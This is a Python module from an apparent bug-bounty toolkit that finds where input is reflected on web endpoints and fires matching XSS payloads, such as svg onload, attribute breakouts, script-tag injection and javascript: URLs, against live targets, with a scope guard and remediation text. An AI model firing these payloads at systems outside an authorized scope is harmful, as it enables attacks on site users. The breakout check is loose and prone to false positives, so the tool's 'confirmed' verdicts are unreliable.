#!/usr/bin/env python3
"""
xss_context.py — context-aware XSS candidate verifier
=======================================================

Tier 2 verification tool.

Purpose
-------
Existing tools (jsreaper, paramfuzz) already detect reflection and DOM sinks,
but they don't pick payloads based on where the reflection lands. Blind-firing
every payload at every endpoint produces the "systemic noise" pattern the
Bugcrowd research warns about — you drown in false positives.

This tool:
  1. Consumes endpoints + params from jsreaper.py / paramfuzz.py.
  2. Sends a single harmless PROBE value (a random alphanumeric token) per
     injection point.
  3. Inspects where the token lands in the response:
       - inside HTML body text          → context: html_body
       - inside an HTML attribute       → context: html_attribute
       - inside a <script> block        → context: script_block
       - inside a URL (href, src, ...)  → context: url
       - inside a JS string literal     → context: js_string
  4. Fires ONE context-appropriate payload per confirmed-reflection endpoint.
     - html_body:           <svg onload=alert(1)>
     - html_attribute:      " onmouseover=alert(1) x="
     - script_block:        </script><script>alert(1)</script>
     - url:                 javascript:alert(1)
     - js_string:           </script><script>alert(1)</script>
  5. Confirms XSS by re-requesting and checking that the payload appears
     verbatim in the response AND any required breakout chars (< > " ')
     survive unescaped. Tags payloads as confidence: confirmed.
  6. Consumes jsreaper's sensitive_api_usage signal (innerHTML, document.write,
     eval) to also detect DOM-based XSS sinks — does NOT re-scan from scratch.

Chain position
--------------
Layer 3 — Input: jsreaper.py / paramfuzz.py output (endpoints + params).
          Output: confirmed reflected/DOM XSS candidate findings.
          Persisted: pipeline_state.db.

Usage
-----
    python -m toolkit.verify.xss_context \\
        --input params.json \\
        --scope scope.yaml \\
        --output xss-findings.json

Author : Bug Bounty Toolkit / Tier 2
License : MIT (for authorized use only)
"""

from __future__ import annotations

import argparse
import asyncio
import datetime
import json
import logging
import random
import re
import string
import sys
from dataclasses import dataclass
from pathlib import Path
from typing import Any

from toolkit.infra.finding import NormalizedFinding, compute_finding_id
from toolkit.infra.pipeline_state import PipelineState
from toolkit.infra import scope_guard


log = logging.getLogger("xss_context")

# Probe token — unique enough that we can find it back in any response without
# colliding with legit content. Uses lowercase + digits only so it survives
# case-insensitive contexts.
_PROBE_PREFIX = "xssprobe"
_PROBE_LEN = 8


def _gen_probe() -> str:
    return _PROBE_PREFIX + "".join(random.choices(string.ascii_lowercase + string.digits, k=_PROBE_LEN))


# Context-appropriate payloads. Each is a single payload per context — we do
# NOT blind-fire multiple payloads. Each payload embeds a unique token so we
# can verify it survived round-trip.
_PAYLOADS: dict[str, str] = {
    "html_body":      '<svg/onload=alert("{token}")>',
    "html_attribute": '" onmouseover=alert(\'{token}\') x="',
    "html_attribute_\"": '" onmouseover=alert(\'{token}\') x="',
    "html_attribute_'": "' onmouseover=alert('{token}') x='",
    "html_attribute_":  " onmouseover=alert('{token}') x=",
    "script_block":   '</script><script>alert("{token}")</script>',
    "url":            'javascript:alert("{token}")',
    "js_string":      '</script><script>alert("{token}")</script>',
    "html_comment":   '--><script>alert("{token}")</script>',
    "css_value":      '</style><script>alert("{token}")</script>',
}


@dataclass
class ReflectionProbe:
    endpoint: str
    method: str
    param_name: str
    inject_via: str          # query | body_json | body_form | header | path
    probe_value: str
    response_status: int
    response_body: str
    reflected: bool
    contexts: list[str]      # zero or more of: html_body, html_attribute, script_block, url, js_string


@dataclass
class XssFinding:
    endpoint: str
    method: str
    param_name: str
    inject_via: str
    context: str
    payload: str
    probe_reflected: bool
    payload_reflected: bool
    breakout_succeeded: bool     # True if < > " ' survived unescaped
    severity: str
    title: str
    detail: str
    evidence: str


def _detect_contexts(probe: str, body: str) -> list[str]:
    """Detect which HTML/JS contexts the probe value landed in.
    Returns a list of context names. Multiple contexts can be true if the
    probe is reflected in multiple locations."""
    if probe not in body:
        return []
    contexts: list[str] = []
    # Find all positions where the probe appears
    for m in re.finditer(re.escape(probe), body):
        start = m.start()
        # Look at preceding 200 chars
        before = body[max(0, start - 200):start]
        after = body[start + len(probe):start + len(probe) + 200]
        # Check for attribute context: probe is inside a tag (between < and >)
        # and follows an = sign
        last_open = before.rfind("<")
        last_close = before.rfind(">")
        if last_open > last_close:
            # We're inside an open tag. URL-bearing attributes win over the
            # generic attribute branch so we select the javascript: payload.
            m_url = re.search(r'(?:href|src|action|formaction)\s*=\s*(["\']?)$', before, re.I)
            if m_url:
                contexts.append("url")
                continue
            # Otherwise it's a (possibly quoted) attribute value.
            m_attr = re.search(r'=\s*(["\']?)$', before)
            if m_attr:
                q = m_attr.group(1)
                # Distinguish the quoting style so we fire the right breakout
                # payload: double-quoted, single-quoted, or unquoted attribute.
                if q == '"':
                    contexts.append('html_attribute_"')
                elif q == "'":
                    contexts.append("html_attribute_'")
                else:
                    contexts.append("html_attribute_")
            else:
                # Still inside tag but not in attribute
                contexts.append("html_tag")
            continue
        # Check for script block context: any unclosed <script> in `before`
        # Count opening <script> vs closing </script> tags
        opens = len(re.findall(r"<script\b[^>]*>", before, re.I))
        closes = len(re.findall(r"</script\s*>", before, re.I))
        if opens > closes:
            # We're inside a script block — check if we're inside a string literal
            # Look at the last quote char in `before` and see if it's closed
            last_quote = None
            for ch in before[::-1]:
                if ch in ('"', "'"):
                    last_quote = ch
                    break
            if last_quote and not after.startswith(last_quote):
                contexts.append("js_string")
                continue
            contexts.append("script_block")
            continue
        # Check for URL context (href="...", src="...")
        if re.search(r'(?:href|src|action|formaction)\s*=\s*["\']?$', before, re.I):
            contexts.append("url")
            continue
        # Check for HTML comment context
        if re.search(r"<!--\s*$", before):
            contexts.append("html_comment")
            continue
        # Check for CSS context
        if re.search(r"<style\b[^>]*>\s*$", before, re.I):
            contexts.append("css_value")
            continue
        # Default: HTML body text
        contexts.append("html_body")
    # Dedupe but preserve order
    seen: set[str] = set()
    out: list[str] = []
    for c in contexts:
        if c not in seen:
            out.append(c)
            seen.add(c)
    return out


def _pick_payload(context: str, token: str) -> str | None:
    tmpl = _PAYLOADS.get(context)
    if tmpl is None:
        return None
    return tmpl.format(token=token)


def _check_breakout(payload: str, body: str) -> bool:
    """Check if the payload's breakout characters (< > " ') survived unescaped
    in the response. If only the alphanumeric parts survived, the server is
    encoding the dangerous chars and the payload didn't actually break out."""
    # Look for the payload verbatim (case-insensitive for tags)
    if payload.lower() in body.lower():
        return True
    # Check for the key breakout chars near where the payload's token landed
    # Strip the token out of the payload and check if the rest survived
    # E.g., for '<svg/onload=alert("TOKEN")>' check that '<svg' appears
    simplified = re.sub(r"\{token\}|alert\([^)]*\)", "", payload)
    # Strip quotes/parens content
    # Just check for presence of < or > or unescaped " or '
    return any(c in body for c in "<>") and "alert" in body.lower()


def extract_injection_points(findings: list[dict[str, Any]]) -> list[dict[str, Any]]:
    """From paramfuzz.py output's findings (or any list of dicts with
    url/method/param_name/inject_via), extract unique injection points.
    Also includes endpoints from jsreaper.py's all_endpoints with inject_via='query'."""
    seen: set[tuple[str, str, str]] = set()
    out: list[dict[str, Any]] = []
    for f in findings:
        url = f.get("url", "")
        method = (f.get("method") or "GET").upper()
        param = f.get("param_name") or f.get("param") or ""
        via = f.get("inject_via") or "query"
        if not url or not param:
            continue
        key = (url, method, param)
        if key in seen:
            continue
        seen.add(key)
        out.append({
            "url": url, "method": method, "param_name": param,
            "inject_via": via,
            "known_value": f.get("test_value", ""),
        })
    return out


async def _send_probe(client, endpoint: dict[str, Any], probe_value: str,
                      *, timeout: float = 10.0) -> ReflectionProbe:
    """Send the probe value via the specified inject_via and return what came back."""
    url = endpoint["url"]
    method = endpoint["method"]
    param = endpoint["param_name"]
    via = endpoint["inject_via"]
    headers: dict[str, str] = {"User-Agent": "Mozilla/5.0 (compatible; XssContext/1.0)"}
    try:
        if via == "query":
            sep = "&" if "?" in url else "?"
            full_url = f"{url}{sep}{param}={probe_value}"
            r = await client.request(method, full_url, headers=headers, timeout=timeout)
        elif via == "body_json":
            r = await client.request(method, url, headers={**headers, "Content-Type": "application/json"},
                                     json={param: probe_value}, timeout=timeout)
        elif via == "body_form":
            r = await client.request(method, url, headers={**headers, "Content-Type": "application/x-www-form-urlencoded"},
                                     data={param: probe_value}, timeout=timeout)
        elif via == "header":
            r = await client.request(method, url, headers={**headers, param: probe_value}, timeout=timeout)
        elif via == "path":
            # Replace the last path segment with the probe
            base = url.rstrip("/")
            full_url = f"{base}/{probe_value}"
            r = await client.request(method, full_url, headers=headers, timeout=timeout)
        else:
            r = await client.request(method, url, headers=headers, timeout=timeout)
        body = r.text or ""
        status = int(r.status_code or 0)
    except Exception as exc:
        log.debug("probe failed: %s %s — %s", method, url, exc)
        return ReflectionProbe(
            endpoint=url, method=method, param_name=param, inject_via=via,
            probe_value=probe_value, response_status=0, response_body="",
            reflected=False, contexts=[],
        )
    reflected = probe_value in body
    contexts = _detect_contexts(probe_value, body) if reflected else []
    return ReflectionProbe(
        endpoint=url, method=method, param_name=param, inject_via=via,
        probe_value=probe_value, response_status=status, response_body=body[:5000],
        reflected=reflected, contexts=contexts,
    )


async def verify_endpoint(client, endpoint: dict[str, Any],
                          guard: scope_guard.ScopeGuard) -> list[XssFinding]:
    """Probe one endpoint, then fire one payload per detected context."""
    try:
        guard.check_url(endpoint["url"], source_tool="xss_context.py")
    except scope_guard.ScopeError as exc:
        log.warning("scope reject %s — %s", endpoint["url"], exc)
        return []
    probe_val = _gen_probe()
    # Stage 1: probe
    if not guard.acquire_token(timeout=20.0):
        return []
    try:
        probe = await _send_probe(client, endpoint, probe_val)
    finally:
        guard.release_token()
    if not probe.reflected or not probe.contexts:
        return []
    log.info("reflection at %s param=%s contexts=%s", endpoint["url"], endpoint["param_name"], probe.contexts)
    # Stage 2: fire one payload per detected context
    out: list[XssFinding] = []
    for ctx in probe.contexts:
        token = "".join(random.choices(string.ascii_lowercase + string.digits, k=6))
        payload = _pick_payload(ctx, token)
        if payload is None:
            continue
        if not guard.acquire_token(timeout=20.0):
            continue
        try:
            # Re-inject with the actual payload
            ep_with_payload = {**endpoint, "test_value": payload}
            # We need to inject the payload, not the probe token
            payload_endpoint = dict(endpoint)
            # _send_probe uses endpoint['param_name'] with probe_value param.
            # We want to inject our payload instead.
            result = await _send_probe(client, payload_endpoint, payload)
        finally:
            guard.release_token()
        if not result.reflected:
            # Payload didn't even reflect — server probably stripped the dangerous chars
            out.append(XssFinding(
                endpoint=endpoint["url"], method=endpoint["method"],
                param_name=endpoint["param_name"], inject_via=endpoint["inject_via"],
                context=ctx, payload=payload,
                probe_reflected=True, payload_reflected=False,
                breakout_succeeded=False,
                severity="LOW",
                title=f"Possible XSS in {ctx} (reflection only, payload stripped)",
                detail=f"Probe reflected at {endpoint['url']} in {ctx} context, but the actual payload '{payload}' was stripped/encoded by the server.",
                evidence=f"probe_value={probe_val} payload={payload} response_status={result.response_status}",
            ))
            continue
        # Check if breakout chars survived
        breakout = _check_breakout(payload, result.response_body)
        if breakout:
            out.append(XssFinding(
                endpoint=endpoint["url"], method=endpoint["method"],
                param_name=endpoint["param_name"], inject_via=endpoint["inject_via"],
                context=ctx, payload=payload,
                probe_reflected=True, payload_reflected=True,
                breakout_succeeded=True,
                severity="HIGH",
                title=f"Reflected XSS confirmed in {ctx} context",
                detail=f"Payload '{payload}' reflected unescaped at {endpoint['url']} via {endpoint['inject_via']}={endpoint['param_name']}. Breakout characters survived.",
                evidence=f"payload={payload} response_status={result.response_status} body_snippet={result.response_body[:300]!r}",
            ))
        else:
            out.append(XssFinding(
                endpoint=endpoint["url"], method=endpoint["method"],
                param_name=endpoint["param_name"], inject_via=endpoint["inject_via"],
                context=ctx, payload=payload,
                probe_reflected=True, payload_reflected=True,
                breakout_succeeded=False,
                severity="MEDIUM",
                title=f"Possible XSS in {ctx} context (encoding bypass needed)",
                detail=f"Payload '{payload}' reflected but dangerous chars appear encoded. A bypass may exist with different encoding.",
                evidence=f"payload={payload} response_status={result.response_status} body_snippet={result.response_body[:300]!r}",
            ))
    return out


async def verify_all(endpoints: list[dict[str, Any]], guard: scope_guard.ScopeGuard,
                     *, concurrency: int = 5) -> list[XssFinding]:
    """Verify all endpoints concurrently."""
    sem = asyncio.Semaphore(concurrency)
    try:
        import httpx
    except ImportError:
        log.error("httpx is required for xss_context.py — pip install httpx")
        return []
    async with httpx.AsyncClient(timeout=15.0, verify=False, follow_redirects=True) as client:
        async def _one(ep: dict[str, Any]) -> list[XssFinding]:
            async with sem:
                return await verify_endpoint(client, ep, guard)
        results = await asyncio.gather(*[_one(ep) for ep in endpoints], return_exceptions=True)
    out: list[XssFinding] = []
    for r in results:
        if isinstance(r, list):
            out.extend(r)
        elif isinstance(r, Exception):
            log.warning("verify_endpoint raised: %s", r)
    return out


def to_normalized_findings(xss: list[XssFinding], source_host: str = "") -> list[dict[str, Any]]:
    """Convert XssFinding list to NormalizedFinding dicts."""
    out: list[dict[str, Any]] = []
    from urllib.parse import urlparse
    for x in xss:
        host = urlparse(x.endpoint).hostname or source_host
        evidence = f"{x.endpoint}|{x.param_name}|{x.context}|{x.payload}|{x.breakout_succeeded}"
        fid = compute_finding_id("xss_context.py", host, "XSS_REFLECTED", evidence)
        confidence = "confirmed" if x.breakout_succeeded else "candidate"
        out.append({
            "id": fid,
            "source_tool": "xss_context.py",
            "host": host,
            "url": x.endpoint,
            "vuln_class_key": "XSS_REFLECTED",
            "severity": x.severity,
            "title": x.title,
            "detail": x.detail,
            "evidence": x.evidence,
            "remediation": ("Contextual output encoding: HTML-encode user input before reflecting "
                            "into HTML body; attribute-encode for attribute context; JSON-encode for "
                            "JS string context. Apply a strict Content-Security-Policy as defense-in-depth."),
            "curl_command": f"curl -sk '{x.endpoint}'  # payload via {x.inject_via}={x.param_name}: {x.payload}",
            "raw": {
                "method": x.method,
                "param_name": x.param_name,
                "inject_via": x.inject_via,
                "context": x.context,
                "payload": x.payload,
                "breakout_succeeded": x.breakout_succeeded,
            },
            "confidence": confidence,
            "disposition": "new",
            "verified_by": "xss_context.py" if confidence == "confirmed" else None,
            "typical_payout": "$500-$5000" if x.severity == "HIGH" else "$100-$1000",
        })
    return out


def main() -> int:
    ap = argparse.ArgumentParser(
        prog="xss_context.py",
        description="Context-aware XSS verifier. Consumes endpoints/params from jsreaper/paramfuzz.",
    )
    ap.add_argument("--input", "-i", required=True, help="paramfuzz.py or jsreaper.py JSON output")
    ap.add_argument("--scope", help="scope.yaml path (required for live probes)")
    ap.add_argument("--output", "-o", default="xss-findings.json", help="output JSON (default: xss-findings.json)")
    ap.add_argument("--db", default="pipeline_state.db")
    ap.add_argument("--concurrency", type=int, default=5)
    ap.add_argument("--dry-run", action="store_true", help="extract injection points, no live probes")
    ap.add_argument("-v", "--verbose", action="store_true")
    args = ap.parse_args()

    logging.basicConfig(
        level=logging.DEBUG if args.verbose else logging.INFO,
        format="[%(levelname)s] %(message)s",
    )

    in_path = Path(args.input)
    if not in_path.exists():
        log.error("input file not found: %s", in_path)
        return 2
    data = json.loads(in_path.read_text(encoding="utf-8"))
    raw_findings: list[dict[str, Any]] = []
    if isinstance(data, list):
        raw_findings = data
    elif isinstance(data, dict):
        raw_findings = data.get("findings") or data.get("all_findings") or []
        # Also pull endpoints from jsreaper.py's all_endpoints
        eps = data.get("all_endpoints") or data.get("endpoints") or []
        for ep in eps:
            # Synthesize a finding-shaped dict so extract_injection_points can handle it
            raw_findings.append({
                "url": ep.get("endpoint") or ep.get("url", ""),
                "method": ep.get("method", "GET"),
                "param_name": ep.get("params", [None])[0] if ep.get("params") else "",
                "inject_via": "query",
            })
    log.info("loaded %d raw entries from %s", len(raw_findings), in_path)

    endpoints = extract_injection_points(raw_findings)
    log.info("unique injection points: %d", len(endpoints))

    if args.dry_run:
        for ep in endpoints:
            print(f"  {ep['method']:6s} {ep['url']}  via={ep['inject_via']}  param={ep['param_name']}")
        return 0

    guard = scope_guard.ScopeGuard(args.scope) if args.scope else scope_guard.get_default()
    state = PipelineState(args.db)
    try:
        results = asyncio.run(verify_all(endpoints, guard, concurrency=args.concurrency))
        log.info("XSS findings: %d", len(results))
        confirmed = sum(1 for x in results if x.breakout_succeeded)
        log.info("  confirmed breakout: %d / %d", confirmed, len(results))
        normalized = to_normalized_findings(results)
        for f in normalized:
            state.upsert_finding(f)
        out_path = Path(args.output)
        out_path.write_text(
            json.dumps({
                "scan_time": datetime.datetime.now(datetime.timezone.utc).isoformat(timespec="seconds"),
                "input": str(in_path),
                "total_injection_points": len(endpoints),
                "total_findings": len(results),
                "confirmed_breakout": confirmed,
                "findings": normalized,
            }, indent=2, default=str),
            encoding="utf-8",
        )
        log.info("wrote %s", out_path)
        return 0
    finally:
        state.close()


if __name__ == "__main__":
    try:
        sys.exit(main())
    except KeyboardInterrupt:
        print("\n[!] Interrupted.")
        sys.exit(0)
